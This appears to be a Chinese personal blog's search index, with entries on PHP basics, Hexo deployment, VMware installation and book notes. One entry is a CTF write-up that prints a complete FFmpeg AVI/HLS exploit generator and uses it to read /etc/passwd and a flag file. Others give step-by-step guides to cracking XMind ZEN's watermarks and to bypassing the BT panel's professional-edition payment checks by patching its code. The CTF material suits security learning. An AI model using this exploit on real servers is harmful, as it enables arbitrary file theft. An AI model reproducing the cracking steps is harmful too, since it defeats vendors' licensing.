<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[ctf-atd-work-01]]></title>
    <url>%2F2018%2F12%2F21%2FCTF-atd-work-01%2F</url>
    <content type="text"><![CDATA[Web10x00 题目描述 可视部分为 账号登入与密码登入 这是一道入门级的web题 0x01 题目分析随便输入发现有弹窗提示 在这个之前给的提示为弱密码后来大概为了提升自身意识然后就改成这个了 既然是弱密码那么我们可以尝试一些弱密码比如说啥admin、root等等 经过一些数据测试发现当用户名为 admin 时没有弹窗 说明用户名可能为这个 按照这种累题目的思路来看一定会有一个指定的密码库 所以开始群寻找我们的密码库 0x02 题目复现查看我们的响应发现有Hint: robots.txt 当我们在url输入后发现啊21232f297a57a5a743894a0e4a801fc3 于是我们又把这个输入到url震惊的发现Flag is not Here!不用慌打开我们的F12果然嘴上说着不要身体还是挺老实的 于是 嗯 再次输入后开始下载了恭喜 喜提账号密码 CVE-2017-99930x00 题目描述似乎就是一个 文件上传 FFmpeg是一套可以用来记录、转换数字音频、视频，并能将其转化为流的开源计算机程序,可用于预览生成和视频转换的视频编码软件 0x00 漏洞分析不会进行漏洞分析 脚本还没看懂 哭唧唧 只会使用脚本可以进行任意文件的读取 0x00 漏洞复现1.编写脚本gen_xbin_avi.py123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147#!/usr/bin/env python3import structimport argparseimport randomimport stringAVI_HEADER = b"RIFF\x00\x00\x00\x00AVI LIST\x14\x01\x00\x00hdrlavih8\x00\x00\x00@\x9c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00&#125;\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x00\x00\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00LISTt\x00\x00\x00strlstrh8\x00\x00\x00txts\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x19\x00\x00\x00\x00\x00\x00\x00&#125;\x00\x00\x00\x86\x03\x00\x00\x10'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\xa0\x00strf(\x00\x00\x00(\x00\x00\x00\xe0\x00\x00\x00\xa0\x00\x00\x00\x01\x00\x18\x00XVID\x00H\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00LIST movi"ECHO_TEMPLATE = """### echoing &#123;needed!r&#125;#EXT-X-KEY: METHOD=AES-128, URI=/dev/zero, IV=0x&#123;iv&#125;#EXTINF:1,#EXT-X-BYTERANGE: 16/dev/zero#EXT-X-KEY: METHOD=NONE"""# AES.new('\x00'*16).decrypt('\x00'*16)GAMMA = b'\x14\x0f\x0f\x10\x11\xb5"=yXw\x17\xff\xd9\xec:'FULL_PLAYLIST = """#EXTM3U#EXT-X-MEDIA-SEQUENCE:0&#123;content&#125;#### random string to prevent caching: &#123;rand&#125;#EXT-X-ENDLIST"""EXTERNAL_REFERENCE_PLAYLIST = """#### External reference: reading &#123;size&#125; bytes from &#123;filename&#125; (offset &#123;offset&#125;)#EXTINF:1,#EXT-X-BYTERANGE: &#123;size&#125;@&#123;offset&#125;&#123;filename&#125;"""XBIN_HEADER = b'XBIN\x1A\x20\x00\x0f\x00\x10\x04\x01\x00\x00\x00\x00'def echo_block(block): assert len(block) == 16 iv = ''.join(map('&#123;:02x&#125;'.format, [x ^ y for (x, y) in zip(block, GAMMA)])) return ECHO_TEMPLATE.format(needed=block, iv=iv)def gen_xbin_sync(): seq = [] for i in range(60): if i % 2: seq.append(0) else: seq.append(128 + 64 - i - 1) for i in range(4, 0, -1): seq.append(128 + i - 1) seq.append(0) seq.append(0) for i in range(12, 0, -1): seq.append(128 + i - 1) seq.append(0) seq.append(0) return seqdef test_xbin_sync(seq): for start_ind in range(64): path = [start_ind] cur_ind = start_ind while cur_ind &lt; len(seq): if seq[cur_ind] == 0: cur_ind += 3 else: assert seq[cur_ind] &amp; (64 + 128) == 128 cur_ind += (seq[cur_ind] &amp; 63) + 3 path.append(cur_ind) assert cur_ind == len(seq), "problem for path &#123;&#125;".format(path)def echo_seq(s): assert len(s) % 16 == 0 res = [] for i in range(0, len(s), 16): res.append(echo_block(s[i:i + 16])) return ''.join(res)test_xbin_sync(gen_xbin_sync())SYNC = echo_seq(gen_xbin_sync())def make_playlist_avi(playlist, fake_packets=1000, fake_packet_len=3): content = b'GAB2\x00\x02\x00' + b'\x00' * 10 + playlist.encode('ascii') packet = b'00tx' + struct.pack('&lt;I', len(content)) + content dcpkt = b'00dc' + struct.pack('&lt;I', fake_packet_len) + b'\x00' * fake_packet_len return AVI_HEADER + packet + dcpkt * fake_packetsdef gen_xbin_packet_header(size): return bytes([0] * 9 + [1] + [0] * 4 + [128 + size - 1, 10])def gen_xbin_packet_playlist(filename, offset, packet_size): result = [] while packet_size &gt; 0: packet_size -= 16 assert packet_size &gt; 0 part_size = min(packet_size, 64) packet_size -= part_size result.append(echo_block(gen_xbin_packet_header(part_size))) result.append( EXTERNAL_REFERENCE_PLAYLIST.format( size=part_size, offset=offset, filename=filename)) offset += part_size return ''.join(result), offsetdef gen_xbin_playlist(filename_to_read): pls = [echo_block(XBIN_HEADER)] next_delta = 5 for max_offs, filename in ( (5000, filename_to_read), (500, "file:///dev/zero")): offset = 0 while offset &lt; max_offs: for _ in range(10): pls_part, new_offset = gen_xbin_packet_playlist( filename, offset, 0xf0 - next_delta) pls.append(pls_part) next_delta = 0 offset = new_offset pls.append(SYNC) return FULL_PLAYLIST.format(content=''.join(pls), rand=''.join( random.choice(string.ascii_lowercase) for i in range(30)))if __name__ == "__main__": parser = argparse.ArgumentParser('AVI+M3U+XBIN ffmpeg exploit generator') parser.add_argument( 'filename', help='filename to be read from the server (prefix it with "file://")') parser.add_argument('output_avi', help='where to save the avi') args = parser.parse_args() assert '://' in args.filename, "ffmpeg needs explicit proto (forgot file://?)" content = gen_xbin_playlist(args.filename) avi = make_playlist_avi(content) output_name = args.output_avi with open(output_name, 'wb') as f: f.write(avi) 2.运行脚本 生成.avi上传文件python3 gen_xbin_avi.py file:///etc/passwd sxcurity.avi 3.上传生成的 sxcurity.avi文件 4.介于我们的hint是/usr/local/src/flag那么我们直接针对路径下的文件进行操作 生成代码：python3 gen_xbin_avi.py file:///usr/local/src/flag sxcurity.avi 5.上传文件获取flag]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[手动破解 XMind ZEN]]></title>
    <url>%2F2018%2F12%2F12%2FPoje-XMind-ZEN%2F</url>
    <content type="text"><![CDATA[首先说明一下，尊重作者的产品。 本片文章思路来源于dx老哥的文章，仅加以完善。 XMind ZEN 是一款免费的软件，只是在导出的时候安排上了专属水印 这次的破解 采用绕过式 仅属于娱乐 干货首先我们需要了解一下我们的XMind ZEN的安装位置在哪:C:\Program Files\XMind ZEN 我们采用的方法 不是删除，而是替换 导出水印然后我们需要了解一下 矢量图文件位置：resources\out\imgs\[类型]-watermark-[语言].svg比如：中文的PNG导出的水印：矢量图文件位置：resources\out\imgs\png-watermark-zh-CN.svg PNG去水印因为我们大部分采用的都是中文模式，所以对应的文件应该是：resources\out\imgs\png-watermark-zh-CN.svg 这里拿英文版本的进行对比 我们将不透明度设置为0，即全透明，不影响导出 PDF去水印pdf背景水印路径：resources\app\out\imgs\print-watermark-zh-CN.svg将它设置为透明 opacity=&quot;0&quot; pdf 底部水印resources\app\out\imgs\pdf-footer-zh-CN.svg我们可以考虑下 添加透明度 opacity=&quot;0&quot; 到这里 我们其实可以发现除了手动添加一定内容，也可以考虑把水印内容全部删除，也有同样的奇效 订阅弹窗在保存的时候时常会出现一个窗口，提示你订阅购买该产品 这个比较神奇首先我们找到路径resources\app\out\modal-activateAlert.js发现这个js文件压缩在一起了 于是 找一个在线js格式化 格式化一下 然后再复制粘贴回来 于是奇效发生了 ps.只适合 v9.1.3版本之前，因为在这个版本之后对文件进行了打包可以考虑到该文件下resources\app\locales\new_translations.json进行修改取消更新提醒 &quot;Software Update&quot;: false, 附件XMind ZEN v9.0.6]]></content>
      <categories>
        <category>pojie</category>
      </categories>
      <tags>
        <tag>小配件</tag>
        <tag>pojie</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP - 06 简易表白墙]]></title>
    <url>%2F2018%2F11%2F14%2FPHP-simple-confession-wall%2F</url>
    <content type="text"><![CDATA[这次，我们直接从一个小应用开始 函数解释require_once() require_once()语句在脚本执行期间包含并运行指定文件(通俗一点，括号内的文件会执行一遍)。此行为和require()语句类似，唯一区别是如果该文件中的代码已经被包含了，则不会再次包含。 count() 计算数组中的单元数目，或对象中的属性个数 array_key_exists() 检查数组里是否有指定的键名或索引 file_exists() 检查文件或目录是否存在 json_decode() 对 JSON 格式的字符串进行解码 json_last_error() 返回最后发生的错误 JSON_ERROR_NONE 常量—没有错误发生 trim() 去除字符串首尾处的空白字符（或者其他字符） time() 返回当前的 Unix 时间戳 date() 格式化一个本地时间／日期 json_encode() 对变量进行 JSON 编码 逻辑前端进行输入 php进行判断 如果输入成功则显示写入成功，如果写入是数据不完整 否则写入失败 表白墙历史采用的是一个迭代手段 使用for循环迭代将后端传输过来的数据进行list read()函数将文件中的数据解码读取出来并以数组的形式保存 write()函数将数据编码加密写入到文件中 如何运行在根目录运行命令： 1php -S localhost:8080 打开浏览器，访问：http://localhost:8080/ 即可 文件说明 index.php 项目界面显示 lib.php 项目数据处理 data.json 表白数据 style.css 界面样式 更新历史 v1.2 修正显示 v1.1 添加样式 添加背景 v1.0 基本功能 源码下载链接]]></content>
      <categories>
        <category>PHP学习</category>
      </categories>
      <tags>
        <tag>安装与配置</tag>
        <tag>PHP</tag>
        <tag>basic</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP - 05 表单]]></title>
    <url>%2F2018%2F11%2F14%2FPHP-form%2F</url>
    <content type="text"><![CDATA[我们简单的来讲讲表单 全局变量 $GLOBALS $_SERVER $_REQUEST $_POST $_GET $_FILES $_ENV $_COOKIE $_SESSION $_SERVER$_SERVER 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。 $_POST预定义的 $_GET 变量用于收集来自 method=”post” 的表单中的值。 $_GET预定义的 $_GET 变量用于收集来自 method=”get” 的表单中的值。 $_REQUEST预定义的 $_REQUEST 变量可用来收集通过 GET 和 POST 方法发送的表单数据。 表单输入框输入123456789101112131415161718&lt;html&gt;&lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;title&gt;表单&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;form method="post"&gt;名字: &lt;input type="text" name="name"&gt;年龄: &lt;input type="text" name="age"&gt;&lt;input type="submit" value="提交"&gt;&lt;/form&gt; &lt;/body&gt;&lt;/html&gt;&lt;?php if (isset($_POST["name"])) echo '欢迎'.$_POST["name"].'!'; ?&gt;&lt;br&gt;&lt;?php if (isset($_POST["age"])) echo '你的年龄是'.$_POST["age"].'岁。'; ?&gt; 简单的表单处理就是这样你获取到了数据接下来可以进行判断，进行增删改查等操作]]></content>
      <categories>
        <category>PHP学习</category>
      </categories>
      <tags>
        <tag>安装与配置</tag>
        <tag>PHP</tag>
        <tag>basic</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP - 04 进阶语法(下)]]></title>
    <url>%2F2018%2F11%2F13%2FPHP-advanced-grammar-lower%2F</url>
    <content type="text"><![CDATA[这一节我们来讲类 面向对象成员变量1234567891011&lt;?phpclass Person&#123; public $name = 'tom'; public $age = '18';&#125;$test = new Person();echo 'My name is ' . $test-&gt;name . '我' . $test-&gt;age . '岁了';?&gt;// 输出结果My name is Tom我18岁了 成员函数12345678910111213&lt;?phpclass Person&#123; public function talk() &#123; echo 'PHP is the best language'; &#125;&#125;$test = new Person();$test-&gt;talk();//输出结果 PHP is the best language?&gt; 构造函数在每次创建新对象时会先调用此方法，一般用于赋初操作1234567891011121314151617&lt;?phpclass Person&#123; public $name; public $age; function __construct()&#123; $this-&gt;name = 'Tom'; $this-&gt;age = 18; &#125; public function talk()&#123; echo 'My name is ' . $this-&gt;name . '我' . $this-&gt;age . '岁了'; &#125;&#125;$test = new Person();$test-&gt;talk();// 输出结果My name is Tom我18岁了?&gt; 析构函数析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行1234567891011121314151617181920&lt;?phpclass Person&#123; public $name; public $age; function __construct()&#123; $this-&gt;name = 'Tom'; $this-&gt;age = 18; &#125; function __destruct()&#123; echo 'goodbye'; &#125; public function talk()&#123; echo 'My name is ' . $this-&gt;name . '我' . $this-&gt;age . '岁了'; &#125;&#125;$test = new Person();$test-&gt;talk();?&gt;// 输出结果Myname is Tom我18岁了goodbye 继承PHP 使用关键字extends来继承一个类 PHP不支持多继承1234567891011121314151617&lt;?phpclass Person&#123; public function talk()&#123; echo "hello everybody"; &#125;&#125;class per1 extends Person&#123;&#125;$test = new Per1();$test-&gt;talk();//输出结果 hello everybody?&gt; 方法重写如果从父类继承的方法不能满足子类的需求，可以对其进行改写，这个过程叫方法的覆盖（override），也称为方法的重写。12345678910111213141516171819&lt;?phpclass Person&#123; public function talk()&#123; echo "hello everybody"; &#125;&#125;class per1 extends Person&#123; public function talk()&#123; echo "ni,hao"; &#125;&#125;$test = new Per1();$test-&gt;talk();//输出结果 hello everybody?&gt; 访问权限 public（公有）：公有的类成员可以在任何地方被访问。 protected（受保护）：受保护的类成员则可以被其自身以及其子类和父类访问。 private（私有）：私有的类成员则只能被其定义所在的类访问。 自学部分接口使用关键字interface 定义使用关键字implements实现使用接口（interface），可以指定某个类必须实现哪些方法，但不需要定义这些方法的具体内容。 抽象使用关键字 abstract 定义使用关键字 extends 继承任何一个类，如果它里面至少有一个方法是被声明为抽象的，那么这个类就必须被声明为抽象的。 继承一个抽象类的时候，子类必须定义父类中的所有抽象方法 关键字Static声明类属性或方法为静态，就可以不实例化类而直接访问。静态属性不能通过一个类已实例化的对象来访问 静态属性不可以由对象通过 -&gt; 操作符来访问。 Final如果父类中的方法被声明为 final，则子类无法覆盖该方法。如果一个类被声明为 final，则不能被继承。]]></content>
      <categories>
        <category>PHP学习</category>
      </categories>
      <tags>
        <tag>安装与配置</tag>
        <tag>PHP</tag>
        <tag>basic</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP - 03 进阶语法(上)]]></title>
    <url>%2F2018%2F11%2F08%2FPHP-advanced-grammar-upper%2F</url>
    <content type="text"><![CDATA[回复一下上次碰到的问题： PHP有没有类似C语言的scanf(),答案是没有,PHP是作用于服务器端的脚本语言,所以无法获取用户的键盘输入。 关于常量的定义，除了define()函数还有一个常用的定义方法 const PHP的变量是自动类型转换，指定义变量时不需要指定变量的数据类型，PHP会根据具体引用变量的具体应用环境，将变量转换为合适的数据类型。所以当一个整型与一个数字字符串相加时计算的结果是一个整型的。 PHP is the best languagehttp://php.net/manual/fa/faq.languages.php 字符串并置运算符1234567&lt;?php$txt1 = 'PHP is ';$txt2 = 'the best language';$txt3 = $txt1 . $txt2;echo $txt3;//输出结果 PHP is the best language?&gt; 常用函数strlen() 函数1234&lt;?php echo strlen(`PHP is the best language`); //输出结果为30?&gt; 数组数组的定义 在PHP中，使用array() 函数创建数组12345&lt;?php$txt=array("PHP","is","the","best","language");echo $txt[0] . " " . $txt[1] . " " . $txt[2] . " " . $txt[3] . " " . $txt[4];//输出结果 PHP is the best language?&gt; 数组的分类 数值数组 - 带有数字 ID 键的数组 关联数组 - 带有指定的键的数组，即键值对数组 多维数组 - 包含一个或多个数组的数组 数组的遍历 循环遍历 var_dump() // 用于输出变量的相关信息 魔术常量使用方法直接调用即可1234&lt;?phpecho '这是第 " ' . __LINE__ . ' " 行';?&gt;//这是第" 2 " 行 常用魔术常量PHP中常见的魔术变量 名称 说明 __LINE__ 文件中的当前行号 __FILE__ 文件的完整路径和文件名。如果用在被包含文件中，则返回被包含的文件名。自 PHP 4.0.2 起，__FILE__ 总是包含一个绝对路径（如果是符号连接，则是解析后的绝对路径），而在此之前的版本有时会包含一个相对路径。 __DIR__ 文件所在的目录。如果用在被包括文件中，则返回被包括的文件所在的目录。它等价于 dirname(__FILE__)。除非是根目录，否则目录中名不包括末尾的斜杠。（PHP 5.3.0中新增） = __FUNCTION__ 函数名称（PHP 4.3.0 新加）。自 PHP 5 起本常量返回该函数被定义时的名字（区分大小写）。在 PHP 4 中该值总是小写字母的。 __CLASS__ 类的名称（PHP 4.3.0 新加）。自 PHP 5 起本常量返回该类被定义时的名字（区分大小写）。在 PHP 4 中该值总是小写字母的。类名包括其被声明的作用区域（例如 Foo\Bar）。注意自 PHP 5.4 起 __CLASS__ 对 trait 也起作用。当用在 trait 方法中时，__CLASS__ 是调用 trait 方法的类的名字。 __TRAIT__ Trait 的名字（PHP 5.4.0 新加）。自 PHP 5.4 起此常量返回 trait 被定义时的名字（区分大小写）。Trait 名包括其被声明的作用区域（例如 Foo\Bar）。 __METHOD__ 类的方法名（PHP 5.0.0 新加）。返回该方法被定义时的名字（区分大小写）。 __NAMESPACE__ 当前命名空间的名称（区分大小写）。此常量是在编译时定义的（PHP 5.3.0 新增）。 函数函数的定义使用 function 开头表示为一个函数 123456&lt;?phpfunction functionName()&#123; // Code...&#125;?&gt; 带参数的函数123456&lt;?phpfunction functionName($value)&#123; // Code...&#125;?&gt; 带返回值的函数1234567&lt;?phpfunction functionName()&#123; // Code... return 1;&#125;?&gt;]]></content>
      <categories>
        <category>PHP学习</category>
      </categories>
      <tags>
        <tag>安装与配置</tag>
        <tag>PHP</tag>
        <tag>basic</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP - 02 基本语法]]></title>
    <url>%2F2018%2F11%2F01%2FPHP-basic-grammar%2F</url>
    <content type="text"><![CDATA[回复一下上次碰到的问题： 为什么输出I LOVE ATD的时候中间没有空格，原因是没仔细看，其实还有 为什么在echo &#39;I LOVE ATD&#39;; 可以选择不打空格，原因是因为只有一个表达式时可以不打分号 有关站点配置，创建的站点无法使用设置好的域名访问，原因是你的host文件未进行修改 PHP有什么用，在无html的基础下，php将无法展现出语言的特性，php主要是面向服务器的，与服务器进行交互，将数据由前端传编辑修改发送到数据库 服务器是什么，这个就像高中时候力、摩尔一样，你学着学着就明白了，当然，也可以查看百度。简单来说，一台电脑是一台服务器 开始于结束标记php 有四种开始结束标记 ，这里不讲，仅做了解 在一个 PHP 代码段中的最后一行可以不用分号结束我们一般使用的是第一种形式 注释注释 // /* */ # 变量在php中变量的表示为美元符号$ 加上你的变量名例如1234567&lt;?php$a = 'i';$b = 'love';$c = 'ATD';echo "$a $b $c"; // 输出 "i love atd"?&gt; 数据类型 Boolean 布尔类型 Integer 整型 Float 浮点型 String 字符串 Array 数组 Object 对象 NULL 输出语句在 PHP 中有两个基本的输出方式： echo 和 print区别: echo - 可以输出一个或多个字符串 print - 只允许输出一个字符串，返回值总为 1 常量设置常量的函数 define()的函数语法：bool define ( string $name , mixed $value [, bool $case_insensitive = false ] ) name：必选参数，常量名称，即标志符。 value：必选参数，常量的值。 case_insensitive ：可选参数，如果设置为 TRUE，该常量则大小写不敏感。默认是大小写敏感的。 1234&lt;?phpdefine("TEST", "ATD family",FALSE);echo TEST; // 输出 "ATD family"?&gt; 基本运算 PHP7+ 版本新增整除运算符 intdiv() 判断语句if 、if..else..、if..elseif..、switch...case.. 123if (condition) &#123; # code...&#125; 123456if (condition) &#123; # code...&#125; else &#123; # code...&#125; 12345if (condition) &#123; # code...&#125; elseif (condition) &#123; # code...&#125; 123456789switch ($variable) &#123; case 'value': # code... break; default: # code... break;&#125; 循环语句for、while、do..while123for ($i=0; $i &lt; ; $i++) &#123; # code...&#125; 123while ($a &lt;= 10) &#123; # code...&#125; 123do &#123; # code...&#125; while ($a &lt;= 10);]]></content>
      <categories>
        <category>PHP学习</category>
      </categories>
      <tags>
        <tag>安装与配置</tag>
        <tag>PHP</tag>
        <tag>basic</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[转移Hexo搭建的博客到自己的阿里云服务器]]></title>
    <url>%2F2018%2F10%2F20%2FBlog-transfer-Hexo-built-blog-to-own-server%2F</url>
    <content type="text"><![CDATA[上一篇文章介绍了如何配置Hexo，但是在使用的时候发现Github的速度并不能让人满意，于是开始转战我的阿里云 创建一个 git 用户 专门运行 git 服务1$ sudo adduser git 为了安全 ssh 连接配对1$ ssh-keygen 创建公钥私钥对1$ ssh-copy-id -i .ssh/id_rsa.pub 用户名字@192.168.x.xxx 将公钥复制到远程机器中 我的ssh好像翻车了 但是问题不大 手动输入密码这里的作用就是方便连接 ssh-keygen 产生公钥与私钥对.ssh-copy-id 将本机的公钥复制到远程机器的创建证书登录，把自己电脑的公钥，也就是 ~/.ssh/id_rsa.pub 文件里的内容添加到服务器的 /home/git/.ssh/authorized_keys 文件中，添加公钥之后可以防止每次 push 都输入密码。 在服务器上弄个 Git 仓库123$ mkdir hexo.git$ cd hexo.git$ git init --bare 使用 –bare 参数，Git 就会创建一个裸仓库，为共享而存在 编写脚本1`$ cd /home/git/hexo.git/hooks` 1`$ vim post-receive` 12#!/bin/shgit --work-tree=/www/wwwroot/www.mobenw.cn --git-dir=/home/git/hexo.git checkout -f /www/wwwroot/www.mobenw.cn 网站目录/home/git/hexo.git 仓库 以上操作实现了自动部署的功能 提权12$ chmod +x post-receive为这个文件提权 1$ sudo chown -R git:git hexo.git 使hexo.blog该目录的拥有者为 git $ chmod 777 -R /www/wwwroot/www.mobenw.cn至少这里有写的权限 本地配置本地hexo目录下的_config.yml1234deploy: type: git repo: aliyun: git@192.168.x.xxx:/home/git/hexo.git 收工接下来就是正常的 hexo 的操作…]]></content>
      <categories>
        <category>Hexo博客搭建</category>
      </categories>
      <tags>
        <tag>安装与配置</tag>
        <tag>Hexo</tag>
        <tag>NexT</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[VMware Workstation 14 Pro 的安装及使用]]></title>
    <url>%2F2018%2F10%2F08%2FInstallation-and-use-of-VMware-Workstation-14%2F</url>
    <content type="text"><![CDATA[既然前人们都造了轮子，而且轮子还很好用，那么我就直接借鉴整合下需要的。 ps.首先安装虚拟机-&gt; 然后使用注册机激活 -&gt; 创建虚拟机并添加镜像文件 -&gt; 开启此虚拟机进行安装 虚拟机VMware Workstation 14 Pro这是 VMware 14 pro 的下载链接访问密码: z07v 这是 VMware 14 pro 的安装教程链接 镜像文件Ubuntu这是 Ubuntu 18.04.1 LTS 的下载链接 这是 Ubuntu 的安装教程链接 这是 Ubuntu 的安装教程 （包含了VMware Tools的安装）链接 rhel这是 rhel 7.2 镜像文件的下载链接访问密码: mz60 这是 rhel 7.2 的安装教程 （略微简单）链接 这是 rhel 7.2 的安装教程 （略微详细）链接 这是rhel的Vmware Tools 的安装教程链接 解压版本来安排了解压版的，但是考虑到，会有一些版本问题，这里就不放上了 对于大部分电脑来说 完成这些步骤基本上就可以运行了 部分电脑可能会出现点问题 比如虚拟化等等 这里提供一个好用的东西 常见问题都能解决的 链接]]></content>
      <categories>
        <category>安装新东西</category>
      </categories>
      <tags>
        <tag>安装与配置</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[宝塔专业版破解方案]]></title>
    <url>%2F2018%2F09%2F26%2FBT-upgrading%2F</url>
    <content type="text"><![CDATA[本方法用水大佬提供，献上水大佬的网站 https://www.gksec.com/ 破解思路 安装宝塔 将宝塔升级至专业版 修改配置文件! 安装方法使用 SSH 连接工具，如宝塔远程桌面助手连接到您的 Linux 服务器后，根据系统执行相应命令开始安装（大约2分钟完成面板安装）： Centos安装脚本 yum install -y wget &amp;&amp; wget -O install.sh http://download.bt.cn/install/install_pro.sh &amp;&amp; sh install.shUbuntu/Deepin安装脚本 wget -O install.sh http://download.bt.cn/install/install-ubuntu_pro.sh &amp;&amp; sudo bash install.shDebian安装脚本 wget -O install.sh http://download.bt.cn/install/install-ubuntu_pro.sh &amp;&amp; bash install.shFedora安装脚本 wget -O install.sh http://download.bt.cn/install/install_pro.sh &amp;&amp; bash install.sh 升级方法 使用 SSH 连接工具，如宝塔远程桌面助手连接到您的 Linux 服务器后，执行以下命令，升级专业版不会对网站环境有任何影响。免费版升级专业版脚本 wget -O update.sh http://download.bt.cn/install/update_pro.sh &amp;&amp; bash update.sh pro 修改配置明确目标 进入该目录下/www/server/panel/class/修改这三个文件 commmon.pypanelAuth.pypanelPlugin.py 首先你需要一个神器 MobaXterm_Personal_10.2.exe 使用神器 ssh 登入你的服务器 登入后你就会发现 这个软件居然有目录 进行下一步之前，我们需要将我们的宝塔升级至专业版 升级到专业版后 你会发现你进入宝塔需要支付才能进入 这里不要慌 我们继续看我们的神器 将我们的文件目录调至/www/server/panel/class/ 然后找到我们的需要修改的第一个文件commmon.py拖到桌面上来 源目录下的这两个文件commmon.py commmon.pyc可以删了，然后打开我们拖出来的这个文件 进行修改 修改完了 再放回去 修改内容：注释该行raise web.seeother(&#39;/vpro&#39;);将这个跳转页面注释了 同理操作删除 panelAuth.pyc修改 panelAuth.py 修改内容：添加result= {&#39;status&#39; : True} 同理操作删除 panelPlugin.pyc修改 panelPlugin.py 修改内容：删除了不用的东西为我们的付费页面改个名 修改完成 我们重启一下我们的宝塔service bt restart 修改完成我们欣赏一下我们的修改结果 ps.网站防篡改程序 这个无法使用]]></content>
      <categories>
        <category>安装新东西</category>
      </categories>
      <tags>
        <tag>安装与配置</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP - 01 环境配置]]></title>
    <url>%2F2018%2F09%2F04%2FPHP-prepare-for-work%2F</url>
    <content type="text"><![CDATA[使用软件 vscode phpstudy 下载编辑器 Visual Studio Code 官网下载链接：https://aka.ms/win32-x64-user-stable 服务器 phpstudy 官网下载链接：http://phpstudy.php.cn/phpstudy/PhpStudy20180211.zip 安装略 安装过程简单，一路回车，默认配置，可以修改一下安装路径，然后ok。 注意事项安装完phpstudy 打开后可能会出现 缺少vc库 可自行对应百度下载相应的vc 附件中提供了部分vc库 ps.必须安装32位的运行库 使用双击快捷键打开 emmmm 能打开就差不多了 关于使用 下一节再讲 可以自己摸索摸索 不对 应该好好的安排一下的 我们来输出一下 “helloworld” 输出”helloworld”1.首先我们打开我们的phpstudy 2.切换版本至最新版本 (方便之后的框架学习，框架使用到了7.2的新特征) 3.进入你的网站根目录 4.创建一个名为 hello.txt的文本文档，并将其后缀改为.php 5.用vscode打开 hello.php 文件，并编辑下列内容 12345678910&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;?phpecho "Hello World!";?&gt; &lt;/body&gt;&lt;/html&gt; 6.保存编辑后，打开浏览器，在地址栏输入 http://localhost/hello.php 按照这样的步骤 你的 &#39;helloworld&#39; 就出来了 当前部分涉及到 html 具体就……再说 附件Visual Studio Codephpstudy缺少vc9时 x86缺少vc11时 x86缺少vc14时 x86]]></content>
      <categories>
        <category>PHP学习</category>
      </categories>
      <tags>
        <tag>安装与配置</tag>
        <tag>PHP</tag>
        <tag>vscode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[阅读情况]]></title>
    <url>%2F2018%2F09%2F04%2FRead-some-books%2F</url>
    <content type="text"><![CDATA[编号 书名 时间 阅读方式 阅读情况 图书信息 心得 00 《书名》 20xx/xx/xx ~ 20xx/xx/xx 电子书/纸质书 泛读/阅读/精读 版本_作者_出版社 write 01 《编程珠玑》 2018/09/03 ~ 2018/09/04 纸质书 泛读 第2版修订版[美] Jon Bentley著人民邮电出版社 - 02 《数学之美》 2018/09/05 ~ 2018/09/06 纸质书 阅读 第二版吴军著人民邮电出版社 - 03 《关键对话·如何高效能沟通》 2018/09/06 ~ 2018/09/07 纸质书 泛读 第2版[美] 罗恩·麦克米兰等人著机械工业出版社 - 04 《C陷阱与缺陷·CTraps and Pitfalls》 2018/09/09 ~ 2018/09/09 纸质书 泛读 第2版[美] AndrewKoenig等人著人民邮电出版社 - 编程珠玑这本书分了三个部分，分别是基础、性能、应用，每一章中循序渐进，用一个故事做引子，就该问题进行分析，给出其原理，布置习题练习，以及深入阅读及扩展性阅读，其中习题部分紧凑文章内容，由文章内容进行修改或者拓展提升并与后文颇有联系。个人偏好喜欢后面的应用部分，因为列举的大多为常用的方法，方便使用。ok，官方的话说完了，可以随意了。介于没有细读这本书，所以只能进行大概性的描述，这本书讲的还行，就是给人的吸引力可能还是不够，至少对我而言。当然这刚好映衬了它的书名，”珠玑”，这是需要磨练出来的，所以再下次沉下心来的时候，可以考虑再重新阅读一番。 数学之美书如其名，讲述了数学之美，从古至今，从语言到文化，数学一直陪伴这我们，本书将数学与生活联系起来，一切都是有规律一样。本书结构有秩，用一个小事情，引出其中的数学原理，并进行拓展阅读，小结等。文章的内容紧扣，图文结合进行问题提问，并且前文的知识可谓后文做铺垫。丰富的目录信息，概括了文章的大体。ok，官方的话说完了，可以随意了。这本书前面阅读的时候还挺认真的，在后面就有些阅读乏力了，怎么说，这本书真的是适合非专业人士、数学爱好者来阅读，因为我还没有看到任何一条代码出现在里面，说明他的受众想弄得广一些。作者也说过，书中并没有深入描述。这本书让我知道了，好多科学家、好多学校的名字、好多有名实验室、以及一些科技的原理。我认为这本书主要是在讲如何优化算法上。所以说，这本书还行，吐槽一下，那些有名的书，为啥都是他们的子女做的插图。 